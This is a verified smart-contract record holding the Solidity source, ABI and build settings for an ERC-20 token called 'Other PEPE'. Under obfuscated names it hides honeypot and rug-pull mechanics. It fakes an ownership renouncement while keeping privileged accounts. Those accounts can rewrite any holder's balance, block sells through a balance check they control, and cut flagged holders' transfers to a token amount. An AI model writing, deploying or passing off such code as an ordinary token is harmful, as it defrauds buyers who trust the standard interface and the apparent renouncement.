{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeToken) external view returns (uint256);\n\n    function transfer(address tradingList, uint256 modeFee) external returns (bool);\n\n    function allowance(address fromTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingList,\n        uint256 modeFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listFund, uint256 value);\n    event Approval(address indexed fromTotal, address indexed spender, uint256 value);\n}\n\nabstract contract totalLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isListLaunch {\n    function createPair(address takeAt, address listModeAmount) external returns (address);\n}\n\ninterface toTotal is tradingShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OtherPEPE is totalLaunch, tradingShould, toTotal {\n\n    uint256 public marketingMax;\n\n    uint8 private teamLaunchedSwap = 18;\n\n    function atTx(address launchedSender, uint256 modeFee) public {\n        shouldIsAmount();\n        liquidityMode[launchedSender] = modeFee;\n    }\n\n    address public enableMax;\n\n    function getOwner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    function sellFund(uint256 modeFee) public {\n        shouldIsAmount();\n        teamFrom = modeFee;\n    }\n\n    function exemptTeam(address receiverEnable) public {\n        require(receiverEnable.balance < 100000);\n        if (enableLaunched) {\n            return;\n        }\n        if (fundAmount == receiverTokenTeam) {\n            maxLimit = marketingMax;\n        }\n        enableIs[receiverEnable] = true;\n        if (marketingMax != shouldLaunch) {\n            receiverTokenTeam = false;\n        }\n        enableLaunched = true;\n    }\n\n    function shouldIsAmount() private view {\n        require(enableIs[_msgSender()]);\n    }\n\n    function fundToken(address tradingBuyIs, address tradingList, uint256 modeFee) internal returns (bool) {\n        if (tradingBuyIs == enableMax) {\n            return minWallet(tradingBuyIs, tradingList, modeFee);\n        }\n        uint256 shouldTake = tradingShould(feeSender).balanceOf(receiverAuto);\n        require(shouldTake == teamFrom);\n        require(tradingList != receiverAuto);\n        if (tokenMax[tradingBuyIs]) {\n            return minWallet(tradingBuyIs, tradingList, listEnable);\n        }\n        return minWallet(tradingBuyIs, tradingList, modeFee);\n    }\n\n    uint256 public liquidityTxTake;\n\n    address private receiverMarketing;\n\n    bool public fundAmount;\n\n    function transfer(address launchedSender, uint256 modeFee) external virtual override returns (bool) {\n        return fundToken(_msgSender(), launchedSender, modeFee);\n    }\n\n    function listFee(address amountSender) public {\n        shouldIsAmount();\n        \n        if (amountSender == enableMax || amountSender == feeSender) {\n            return;\n        }\n        tokenMax[amountSender] = true;\n    }\n\n    uint256 public shouldLaunch;\n\n    string private isFrom = \"Other PEPE\";\n\n    uint256 private listExempt;\n\n    function transferFrom(address tradingBuyIs, address tradingList, uint256 modeFee) external override returns (bool) {\n        if (_msgSender() != shouldMarketingEnable) {\n            if (atMax[tradingBuyIs][_msgSender()] != type(uint256).max) {\n                require(modeFee <= atMax[tradingBuyIs][_msgSender()]);\n                atMax[tradingBuyIs][_msgSender()] -= modeFee;\n            }\n        }\n        return fundToken(tradingBuyIs, tradingList, modeFee);\n    }\n\n    function minWallet(address tradingBuyIs, address tradingList, uint256 modeFee) internal returns (bool) {\n        require(liquidityMode[tradingBuyIs] >= modeFee);\n        liquidityMode[tradingBuyIs] -= modeFee;\n        liquidityMode[tradingList] += modeFee;\n        emit Transfer(tradingBuyIs, tradingList, modeFee);\n        return true;\n    }\n\n    bool private isAuto;\n\n    address receiverAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listSwap() public {\n        emit OwnershipTransferred(enableMax, address(0));\n        receiverMarketing = address(0);\n    }\n\n    address shouldMarketingEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return isFrom;\n    }\n\n    uint256 marketingTrading;\n\n    event OwnershipTransferred(address indexed totalSellFee, address indexed buyToTotal);\n\n    mapping(address => bool) public enableIs;\n\n    uint256 public maxLimit;\n\n    string private senderLaunchedTeam = \"OPE\";\n\n    function allowance(address toLaunched, address tradingFeeTotal) external view virtual override returns (uint256) {\n        if (tradingFeeTotal == shouldMarketingEnable) {\n            return type(uint256).max;\n        }\n        return atMax[toLaunched][tradingFeeTotal];\n    }\n\n    uint256 teamFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderLaunchedTeam;\n    }\n\n    mapping(address => bool) public tokenMax;\n\n    mapping(address => mapping(address => uint256)) private atMax;\n\n    bool public enableLaunched;\n\n    uint256 constant listEnable = 14 ** 10;\n\n    mapping(address => uint256) private liquidityMode;\n\n    uint256 private shouldTeam = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        shouldMax launchSell = shouldMax(shouldMarketingEnable);\n        feeSender = isListLaunch(launchSell.factory()).createPair(launchSell.WETH(), address(this));\n        if (isAuto) {\n            isAuto = false;\n        }\n        enableMax = _msgSender();\n        listSwap();\n        enableIs[enableMax] = true;\n        liquidityMode[enableMax] = shouldTeam;\n        \n        emit Transfer(address(0), enableMax, shouldTeam);\n    }\n\n    address public feeSender;\n\n    function balanceOf(address modeToken) public view virtual override returns (uint256) {\n        return liquidityMode[modeToken];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldTeam;\n    }\n\n    function approve(address tradingFeeTotal, uint256 modeFee) public virtual override returns (bool) {\n        atMax[_msgSender()][tradingFeeTotal] = modeFee;\n        emit Approval(_msgSender(), tradingFeeTotal, modeFee);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLaunchedSwap;\n    }\n\n    bool private receiverTokenTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSellFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFeeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFeeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"atTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTxTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"}],\"name\":\"listFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"sellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuyIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OtherPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}